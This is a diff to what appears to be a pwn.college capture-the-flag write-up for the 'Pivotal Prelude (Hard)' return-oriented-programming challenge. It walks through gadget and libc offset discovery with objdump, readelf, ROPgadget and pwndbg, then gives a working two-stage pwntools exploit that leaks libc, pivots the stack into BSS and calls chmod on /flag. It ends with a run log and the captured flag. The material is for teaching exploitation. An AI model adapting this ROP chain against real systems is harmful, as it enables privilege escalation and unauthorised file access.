@@ -7717,7 +7717,7 @@ We already know the location in the BSS to which our ROP payload is saved based 
 
 - [ ] Location of the PLT entry of `puts@plt`
 - [ ] Location of the GOT entry of `puts@got`
-- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0`
+- [x] Location of the unexecuted ROP chain within BSS: `0x4150e0 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 - [ ] Address of `_start()`
@@ -8456,7 +8456,6 @@ context.arch = 'amd64'
 pop_rdi = 0x4023f3
 pop_rsi_pop_r15 = 0x4023f1
 pop_rsp_pop_r13_pop_r14_pop_r15 = 0x4023ed
-ret = 0x40101a
 # PLT entries
 puts_plt = 0x401120
 # GOT entries
@@ -8577,22 +8576,335 @@ pwn.college{AshqlZDnJJarLIWj_35ueVUW8RT.01N1MDL4ITM0EzW}
 
 ## Pivotal Prelude (Hard)
 
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ /challenge/pivotal-prelude-hard 
+###
+### Welcome to /challenge/pivotal-prelude-hard!
+###
+
+```
+
+This challenge is similar to the previous one, where we have a limited room on the stack and have to perform a pivot.
+
+Requirements in order to craft an exploit:
+
+- [ ] Location of the PLT entry of `puts@plt`
+- [ ] Location of the GOT entry of `puts@got`
+- [ ] Location of the ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+### Binary Analysis
+
+#### `puts@plt` (Procedure Linkage Table entry)
+
+Let's find the location of the `puts@plt` stub.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ objdump -d /challenge/pivotal-prelude-hard | grep "<puts@plt>:"
+00000000004010a0 <puts@plt>:
+```
+
 - [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
-- [x] Location of the GOT entry of `puts@got`: `0x404020` 
-- [x] Location of the ROP chain within BSS: `0x414080`
-- [x] Offsets of required Libc functions
-   - Offset of the `puts` symbol within Libc: `0x84420`
-   - Offset of the `chmod` symbol within Libc: `0x10dd80`   
-- [x] Locations of required ROP gadgets
+- [ ] Location of the GOT entry of `puts@got`
+- [ ] Location of the ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `puts@got` (Global Offset Table entry)
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -r /challenge/pivotal-prelude-hard | grep "puts"
+000000404020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [ ] Location of the ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [ ] Address of `_start()`
+
+#### `_start()`
+
+We need find this address so the we can can invoke the program again to execute our second stage of payload.
+
+```
+pwndbg> info address _start 
+Symbol "_start" is at 0x4010f0 in a file compiled without debugging.
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [ ] Location of the ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [ ] Locations of required ROP gadgets
+- [x] Address of `_start()`: `0x4010f0`
+
+#### ROP gadgets
+
+Now, we need to find the relevent ROP gadgets, and their addresses.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ ROPgadget --binary /challenge/pivotal-prelude-hard
+Gadgets information
+============================================================
+0x000000000040111d : add ah, dh ; nop ; endbr64 ; ret
+0x000000000040114b : add bh, bh ; loopne 0x4011b5 ; nop ; ret
+0x000000000040141c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
+0x00000000004013a0 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x00000000004013a1 : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
+0x00000000004011ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040141e : add byte ptr [rax], al ; endbr64 ; ret
+0x000000000040111c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
+0x00000000004013a2 : add byte ptr [rax], al ; leave ; ret
+0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
+0x00000000004011bb : add byte ptr [rcx], al ; pop rbp ; ret
+0x00000000004011b9 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x000000000040111b : add byte ptr cs:[rax], al ; hlt ; nop ; endbr64 ; ret
+0x00000000004013a3 : add cl, cl ; ret
+0x000000000040114a : add dil, dil ; loopne 0x4011b5 ; nop ; ret
+0x0000000000401038 : add dl, dh ; jmp 0x401020
+0x00000000004011bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x00000000004011b7 : add eax, 0x2ebb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
+0x0000000000401017 : add esp, 8 ; ret
+0x0000000000401016 : add rsp, 8 ; ret
+0x00000000004012ea : call qword ptr [rax + 0xff3c3c9]
+0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
+0x0000000000401014 : call rax
+0x00000000004011d3 : cli ; jmp 0x401160
+0x0000000000401123 : cli ; ret
+0x000000000040142b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
+0x00000000004011d0 : endbr64 ; jmp 0x401160
+0x0000000000401120 : endbr64 ; ret
+0x00000000004013fc : fisttp word ptr [rax - 0x7d] ; ret
+0x000000000040111e : hlt ; nop ; endbr64 ; ret
+0x0000000000401012 : je 0x401016 ; call rax
+0x0000000000401145 : je 0x401150 ; mov edi, 0x404058 ; jmp rax
+0x0000000000401187 : je 0x401190 ; mov edi, 0x404058 ; jmp rax
+0x000000000040103a : jmp 0x401020
+0x00000000004011d4 : jmp 0x401160
+0x000000000040100b : jmp 0x4840103f
+0x000000000040114c : jmp rax
+0x00000000004012ec : leave ; ret
+0x000000000040114d : loopne 0x4011b5 ; nop ; ret
+0x00000000004011b6 : mov byte ptr [rip + 0x2ebb], 1 ; pop rbp ; ret
+0x000000000040139f : mov eax, 0 ; leave ; ret
+0x00000000004011b8 : mov ebx, 0x100002e ; pop rbp ; ret
+0x0000000000401147 : mov edi, 0x404058 ; jmp rax
+0x000000000040111f : nop ; endbr64 ; ret
+0x00000000004012eb : nop ; leave ; ret
+0x0000000000401282 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401283 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401284 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401285 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401286 : nop ; nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401287 : nop ; nop ; nop ; pop rbp ; ret
+0x0000000000401288 : nop ; nop ; pop rbp ; ret
+0x0000000000401289 : nop ; pop rbp ; ret
+0x000000000040114f : nop ; ret
+0x00000000004011cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401160
+0x0000000000401146 : or dword ptr [rdi + 0x404058], edi ; jmp rax
+0x000000000040140c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040140e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000401410 : pop r14 ; pop r15 ; ret
+0x0000000000401412 : pop r15 ; ret
+0x0000000000401148 : pop rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
+0x000000000040140b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040140f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004011bd : pop rbp ; ret
+0x0000000000401413 : pop rdi ; ret
+0x0000000000401411 : pop rsi ; pop r15 ; ret
+0x000000000040140d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x000000000040101a : ret
+0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
+0x000000000040142d : sub esp, 8 ; add rsp, 8 ; ret
+0x000000000040142c : sub rsp, 8 ; add rsp, 8 ; ret
+0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
+0x0000000000401143 : test eax, eax ; je 0x401150 ; mov edi, 0x404058 ; jmp rax
+0x0000000000401185 : test eax, eax ; je 0x401190 ; mov edi, 0x404058 ; jmp rax
+0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
+
+Unique gadgets found: 78
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [ ] Location of the ROP chain within BSS
+- [ ] Offsets of required Libc functions
+- [x] Locations of required ROP gadgets:
    - `pop rdi ; ret`: `0x401413`
    - `pop rsi ; pop r15 ; ret`: `0x401411`
    - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
 - [x] Address of `_start()`: `0x4010f0`
 
+#### Libc functions
+
+Now, lets find the offset of `puts` and `chmod` within Libc. This will be useful in the second stage of our exploit.
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
+   195: 0000000000084420   476 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
+   430: 0000000000084420   476 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
+   505: 0000000000124550  1268 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
+   692: 0000000000126220   728 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
+  1160: 0000000000082ce0   384 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
+   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+```
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [ ] Location of the ROP chain within BSS
+- [x] Offsets of required Libc functions:
+   - Offset of the `puts` symbol within Libc: `0x84420`
+   - Offset of the `chmod` symbol within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets:
+   - `pop rdi ; ret`: `0x401413`
+   - `pop rsi ; pop r15 ; ret`: `0x401411`
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
+- [x] Address of `_start()`: `0x4010f0`
+
+#### `challenge()`
+
+Finally, let's find the location in the BSS where our ROP payload is initially stored.
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x000000000040128c <+0>:     endbr64
+   0x0000000000401290 <+4>:     push   rbp
+   0x0000000000401291 <+5>:     mov    rbp,rsp
+   0x0000000000401294 <+8>:     sub    rsp,0x40
+   0x0000000000401298 <+12>:    mov    DWORD PTR [rbp-0x24],edi
+   0x000000000040129b <+15>:    mov    QWORD PTR [rbp-0x30],rsi
+   0x000000000040129f <+19>:    mov    QWORD PTR [rbp-0x38],rdx
+   0x00000000004012a3 <+23>:    mov    edx,0x1000
+   0x00000000004012a8 <+28>:    lea    rsi,[rip+0x12dd1]        # 0x414080 <data+65536>
+   0x00000000004012af <+35>:    mov    edi,0x0
+   0x00000000004012b4 <+40>:    call   0x4010c0 <read@plt>
+   0x00000000004012b9 <+45>:    mov    DWORD PTR [rbp-0x4],eax
+   0x00000000004012bc <+48>:    mov    rax,rbp
+   0x00000000004012bf <+51>:    mov    QWORD PTR [rbp-0x10],rax
+   0x00000000004012c3 <+55>:    mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000004012c7 <+59>:    add    rax,0x8
+   0x00000000004012cb <+63>:    mov    edx,0x18
+   0x00000000004012d0 <+68>:    lea    rsi,[rip+0x12da9]        # 0x414080 <data+65536>
+   0x00000000004012d7 <+75>:    mov    rdi,rax
+   0x00000000004012da <+78>:    call   0x4010d0 <memcpy@plt>
+   0x00000000004012df <+83>:    lea    rdi,[rip+0xd1e]        # 0x402004
+   0x00000000004012e6 <+90>:    call   0x4010a0 <puts@plt>
+   0x00000000004012eb <+95>:    nop
+   0x00000000004012ec <+96>:    leave
+   0x00000000004012ed <+97>:    ret
+End of assembler dump.
+```
+
+Let's set a breakpoint at `challenge+78` where the ROP payload is being copied from a source in the BSS to a destination in the stack.
+
+```
+pwndbg> break *(challenge+78)
+Breakpoint 1 at 0x4012da
+```
+
+Let's run.
+
+```
+pwndbg> run
+Starting program: /challenge/pivotal-prelude-hard 
+###
+### Welcome to /challenge/pivotal-prelude-hard!
+###
+
+aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb
+
+Breakpoint 1, 0x00000000004012da in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
+ RAX  0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
+ RBX  0x4013b0 (__libc_csu_init) ◂— endbr64 
+ RCX  0x72b1dfc361f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x18
+ RDI  0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
+ RSI  0x414080 (data+65536) ◂— 'aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb\n'
+ R8   0
+ R9   0x30
+ R10  0x72b1dfd4a3c0 (strcmp+3520) ◂— pxor xmm0, xmm0
+ R11  0x246
+ R12  0x4010f0 (_start) ◂— endbr64 
+ R13  0x7ffe8c19d740 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe8c19d620 —▸ 0x7ffe8c19d650 ◂— 0
+ RSP  0x7ffe8c19d5e0 —▸ 0x72b1dfd114a0 (_IO_file_jumps) ◂— 0
+ RIP  0x4012da (challenge+78) ◂— call memcpy@plt
+────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
+ ► 0x4012da <challenge+78>    call   memcpy@plt                  <memcpy@plt>
+        dest: 0x7ffe8c19d628 —▸ 0x401393 (main+165) ◂— lea rdi, [rip + 0xc8b]
+        src: 0x414080 (data+65536) ◂— 'aaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb\n'
+        n: 0x18
+ 
+   0x4012df <challenge+83>    lea    rdi, [rip + 0xd1e]     RDI => 0x402004 ◂— 'Leaving!'
+   0x4012e6 <challenge+90>    call   puts@plt                    <puts@plt>
+ 
+   0x4012eb <challenge+95>    nop    
+   0x4012ec <challenge+96>    leave  
+   0x4012ed <challenge+97>    ret    
+ 
+   0x4012ee <main>            endbr64 
+   0x4012f2 <main+4>          push   rbp
+   0x4012f3 <main+5>          mov    rbp, rsp
+   0x4012f6 <main+8>          sub    rsp, 0x20
+   0x4012fa <main+12>         mov    dword ptr [rbp - 4], edi
+─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe8c19d5e0 —▸ 0x72b1dfd114a0 (_IO_file_jumps) ◂— 0
+01:0008│-038 0x7ffe8c19d5e8 —▸ 0x7ffe8c19d758 —▸ 0x7ffe8c19f689 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-030 0x7ffe8c19d5f0 —▸ 0x7ffe8c19d748 —▸ 0x7ffe8c19f669 ◂— '/challenge/pivotal-prelude-hard'
+03:0018│-028 0x7ffe8c19d5f8 ◂— 0x1dfbacde5
+04:0020│-020 0x7ffe8c19d600 —▸ 0x4013b0 (__libc_csu_init) ◂— endbr64 
+05:0028│-018 0x7ffe8c19d608 —▸ 0x7ffe8c19d650 ◂— 0
+06:0030│-010 0x7ffe8c19d610 —▸ 0x7ffe8c19d620 —▸ 0x7ffe8c19d650 ◂— 0
+07:0038│-008 0x7ffe8c19d618 ◂— 0x238c19d740
+───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4012da challenge+78
+   1         0x401393 main+165
+   2   0x72b1dfb4c083 __libc_start_main+243
+   3         0x40111e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can see the location in the BSS within the `dest` parameter and also in the `rsi` register.
+
+- [x] Location of the PLT entry of `puts@plt`: `0x4010a0`
+- [x] Location of the GOT entry of `puts@got`: `0x404020`
+- [x] Location of the ROP chain within BSS: `0x414080 + 16` (Because we do not want to execute the first two gadgets again in the BSS.)
+- [x] Offsets of required Libc functions:
+   - Offset of the `puts` symbol within Libc: `0x84420`
+   - Offset of the `chmod` symbol within Libc: `0x10dd80`
+- [x] Locations of required ROP gadgets:
+   - `pop rdi ; ret`: `0x401413`
+   - `pop rsi ; pop r15 ; ret`: `0x401411`
+   - `pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret`: `0x40140d`
+- [x] Address of `_start()`: `0x4010f0`
+
+### ROP chain: Stack pivot + ret2libc
+
+The ROP chain would be the exact same as the one in the [easy level](#rop-chain-stack-pivot--ret2libc).
 
 ### Exploit
 
-```py
+```py title="~/script.py" showLineNumbers
 from pwn import *
 context.arch = 'amd64'
 
@@ -8600,7 +8912,6 @@ context.arch = 'amd64'
 pop_rdi = 0x401413
 pop_rsi_pop_r15 = 0x401411
 pop_rsp_pop_r13_pop_r14_pop_r15 = 0x40140d
-ret = 0x40101a
 # PLT entries
 puts_plt = 0x4010a0
 # GOT entries
@@ -8613,7 +8924,7 @@ offset = 0
 p = process('/challenge/pivotal-prelude-hard')
 
 # --- STAGE 1: Leak address of `puts` within Libc ---
-log.info("Sending Stage 2: puts(puts@got)")
+log.info("Sending Stage 1: puts(puts@got)")
 payload1 = flat(
     b"A" * offset,
 
@@ -8645,10 +8956,6 @@ print(f"[+] libc_base: {hex(libc_base)}")
 print(f"[+] chmod@libc: {hex(chmod_libc)}\n")
 
 # --- STAGE 2: repeat test ---
-# This ensures the "Welcome" message is out of the way 
-# and the program is actually at the 'read' call for Stage 2.
-# p.recvuntil(b"execute your full ropchain!")
-
 flag_str = b"/flag\x00\x00\x00"
 
 log.info("Sending Stage 2: chmod('!', 0o777)")
@@ -8660,11 +8967,38 @@ payload2 = flat(
 
     # chmod("/flag", 0o777)
     pop_rdi, bss_rop_chain_addr,      
-    pop_rsi_pop_r15, 0o777, b"B" * 8, 
+    pop_rsi_pop_r15, 0o777, b"E" * 8, 
     chmod_libc
 )
 
 p.send(payload2)
 
 p.interactive()
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ python ~/script.py
+[+] Starting local process '/challenge/pivotal-prelude-hard': pid 6058
+[*] Sending Stage 1: puts(puts@got)
+
+[+] puts@libc: 0x749b4c72b420
+[+] libc_base: 0x749b4c6a7000
+[+] chmod@libc: 0x749b4c7b4d80
+
+[*] Sending Stage 2: chmod('!', 0o777)
+[*] Switching to interactive mode
+
+###
+### Welcome to (null)!
+###
+
+[*] Process '/challenge/pivotal-prelude-hard' stopped with exit code -11 (SIGSEGV) (pid 6058)
+Leaving!
+[*] Got EOF while reading in interactive
+$  
+```
+
+```
+hacker@return-oriented-programming~pivotal-prelude-hard:/$ cat /flag 
+pwn.college{w0lkI9UBU_5iJK-DGm6-CGh-A4J.0FO1MDL4ITM0EzW}
 ```
